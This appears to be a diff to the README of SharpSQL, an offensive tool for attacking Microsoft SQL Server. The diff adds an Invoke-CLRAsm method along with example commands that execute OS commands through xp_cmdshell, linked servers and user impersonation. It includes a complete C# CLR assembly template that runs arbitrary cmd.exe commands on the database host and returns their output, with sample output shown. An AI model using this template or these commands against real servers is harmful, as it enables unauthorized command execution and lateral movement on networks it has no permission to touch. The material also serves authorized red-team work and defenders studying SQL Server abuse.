@@ -6,6 +6,8 @@ Simple port of PowerUpSQL
 
 Thanks to [tevora-threat](https://github.com/tevora-threat) for getting the ball rolling.
 
+<br>
+
 ## Usage
 ```
 SharpSQL by @mlcsec
@@ -42,12 +44,14 @@ Methods:
     Get-UserPrivs              - Get current user server privileges
     Check-Cmdshell             - Check whether xp_cmdshell is enabled on instance
     Check-LinkedCmdshell       - Check whether xp_cmdshell is enabled on linked server
+    Clear-CLRAsm               - Drop procedure and assembly (run before Invoke-CLRAsm if previous error)
     Enable-Cmdshell            - Enable xp_cmdshell on instance
     Enable-LinkedCmdshell      - Enable xp_cmdshell on linked server
-    Invoke-OSCmd               - Execute system command via_xp_cmdshell on instance
-    Invoke-LinkedOSCmd         - Executes system command via xp_cmdshell on linked server
+    Invoke-OSCmd               - Invoke xp_cmdshell on instance
+    Invoke-LinkedOSCmd         - Invoke xp_cmdshell on linked server
     Invoke-ExternalScript      - Invoke external python script command execution
     Invoke-OLEObject           - Invoke OLE wscript command execution
+    Invoke-CLRAsm              - Invoke CLR assembly procedure command execution
     Invoke-UserImpersonation   - Impersonate user and execute query
     Invoke-DBOImpersonation    - Impersonate dbo on msdb and execute query
 
@@ -60,8 +64,10 @@ Examples:
     SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
     SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command "whoami /all"
     SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command "dir C:\users\"
+    SharpSQL.exe Invoke-CLRAsm -Instance sql.server -Command "whoami && ipconfig"
 ```
 
+<br>
 
 ## Demos and Examples
 ### Get-GroupMembership
@@ -88,9 +94,58 @@ Examples:
 .\SharpSQL.exe invoke-userimpersonation -instance dc01 -user sa -Query "EXEC xp_cmdshell 'whoami'"
 ```
 
+### Command execution via CLR Assembly 
+```
+.\SharpSQL.exe Invoke-clrasm -instance sql01 -command "cd && ipconfig"
+[*] Authenticated to: sql01
+[*] Invoke-CLRAsm:
+C:\Windows\system32
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.168.5
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.168.254
+```
+The following template is currently used for the custom CLR assembly:
+```c#
+using System;
+using Microsoft.SqlServer.Server;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+
+public class ClassLibrary1
+{
+    [Microsoft.SqlServer.Server.SqlProcedure]
+    public static void cmdExec(SqlString execCommand)
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+        
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
+        SqlContext.Pipe.SendResultsStart(record);
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsEnd();
+
+        proc.WaitForExit();
+        proc.Close();
+    }
+}
+```
+The method automatically deletes the created procedure and assembly after each invocation. However, if an error occurs you may have to clear this before the next call by using `Clear-CLRAsm`.
 
 
 
+<br>
 
 
 
@@ -103,7 +158,6 @@ Examples:
     - `Enable-LinkedCmdshell` - rpc or metadata error currently, `Check-LinkedCmdshell` and `Invoke-LinkedOSCmd` work fine
 
 - Add:
-    - `Invoke-CustomAsm`
     - `Add-User`
     - `Add-LinkedUser`
     - `Enable-RPC` - on instance and linkedinstance, allows for EXEC... AT...
